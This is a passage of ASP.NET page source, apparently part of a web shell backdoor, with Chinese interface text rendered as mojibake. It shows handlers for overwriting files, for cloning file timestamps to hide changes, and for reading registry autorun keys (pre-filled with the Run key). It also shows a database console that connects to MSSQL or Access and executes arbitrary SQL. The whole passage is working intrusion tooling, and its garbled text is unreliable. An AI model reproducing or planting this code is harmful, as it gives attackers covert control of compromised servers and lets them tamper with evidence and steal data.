						response.Write("<script>alert('����ͬ���ļ���������ʧ�� :(');location.href='JavaScript:self.close()';</script>")
					end if
				end if
			case "samename"
				url=request.QueryString("src")
		%>
		<div align="center" style="position:absolute;width:100%;visibility:show; z-index:0;left:0px;top:200px">
			<TABLE class="table1" cellSpacing="1" cellPadding="1" width="473" border="0" align="center">
				<tr>
					<td>����ͬ���ļ�,�����ѡNO,���Զ����һ������ǰ׺</td>
				<tr>
					<td class="td2" align="center">
						<form name="form1" method="post" action="?action=plaster&src=<%=server.UrlEncode(url)%>">
							<input name="OverWrite" type="submit" id="OverWrite" value="Yes"> <input name="Cancel" type="submit" id="Cancel" value="No">
						</form>
					</td>
				</tr>
			</TABLE>
		</div>
		<a href="javascript:history.back(1);" style="color:#FF0000">����</a>
		<%
			case "clonetime"'CloneTime
				time1.Text=request.QueryString("src")&"51j.aspx"
				time2.Text=request.QueryString("src")
		%>
		<table width="100%" border="1" align="center" cellpadding="0" cellspacing="0">
			<tr>
				<td class='td1'>�ļ������޸�</td>
			</tr>
			<tr>
				<td class='td2'>
					<form runat="server">
						�Լ�<ul>
							<asp:TextBox ID="time1" runat="server" Width="90%" /></ul>
						Ŀ��<ul>
							<asp:TextBox ID="time2" runat="server" Width="90%" /></ul>
						<asp:Button ID="ButtonClone" Text="Submit" runat="server" OnClick="CloneTime" />
					</form>
				</td>
			</tr>
		</table>
		<% case "reg"'ReadReg %>
		<table width="100%" border="1" align="center" cellpadding="0" cellspacing="0">
			<tr>
				<td class='td1'>ע������</td>
			</tr>
			<tr>
				<td class='td2'>
					<form runat="server">
						Key :<ul>
							<asp:TextBox ID="Reg1" runat="server" Width="90%" Text="HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" />
						</ul>
						Value:<ul>
							<asp:TextBox ID="Reg2" runat="server" Width="90%" Text="KAVRun" />
							<asp:Button ID="RegButtom" runat="server" Text="Sumbit" OnClick="ReadReg" />
						</ul>
					</form>
					<ul class='td3'>
						<asp:Label ID="Label1" runat="server" />
					</ul>
				</td>
			</tr>
		</table>
		<% case "data" 'DataBase%>
		<table width="100%" border="0" align="center" cellpadding="0" cellspacing="0">
			<form runat="server">
				<tr>
					<td class='td1'>���ݿ����<div align="right" style="position:absolute;width:100%;visibility:show; z-index:0;left:0px;top:2px"><asp:Button Text="ReLoad" OnClick="DB_ReLoad" runat="server" /></div>
					</td>
				</tr>
				<tr>
					<td class='td2'>
						Connection String :<ul>
							<asp:TextBox ID="DB_CString" Width="90%" runat="server" />
						</ul>
						Select Database:<ul>
							<asp:RadioButton ID="DB_rB_MSSQL" Text="MSSQL" GroupName="DBSelecting" OnCheckedChanged="DB_onrB_1"
								AutoPostBack="true" runat="server" />
							<asp:RadioButton ID="DB_rB_Access" Text="Access" GroupName="DBSelecting" OnCheckedChanged="DB_onrB_2"
								AutoPostBack="true" runat="server" />
							<asp:Button ID="DB_sButton" runat="server" Text="Submit" OnClick="DB_onsB" />
						</ul>
						<asp:Label ID="db_Label" runat="server" />
						<asp:Label ID="DB_exe" Text="Execute SQL ( No echo ): " Visible="false" runat="server" />
						<ul>
							<asp:TextBox ID="DB_EString" Width="90%" runat="server" Visible="false" />
							<asp:Button ID="DB_eButton" runat="server" Text="Submit" Visible="false" OnClick="DB_oneB" />
						</ul>
						<ul class='td3'>
							<asp:DataGrid ID="DB_DataGrid" with="100%" AllowPaging="true" AllowSorting="true" OnSortCommand="DB_Sort"
								PageSize="10" OnPageIndexChanged="DB_Page" PagerStyle-Mode="NumericPages" runat="server" />
						</ul>
					</td>
				</tr>
			</form>
		</table>
		<%
				case "logout"
   					session.Abandon()
					response.Write("<script>alert('��־��������?');location.href='" & request.ServerVariables("URL") & "';</sc" & "ript>")
				end select
			end if
			Catch error_x
				response.Write("<font color=""red"">����</font>"&error_x.Message)
			End Try
		%>
		<script language="javascript">
			function closewindow()
			{
				self.close();
			}
		</script>
	</body>
</html>
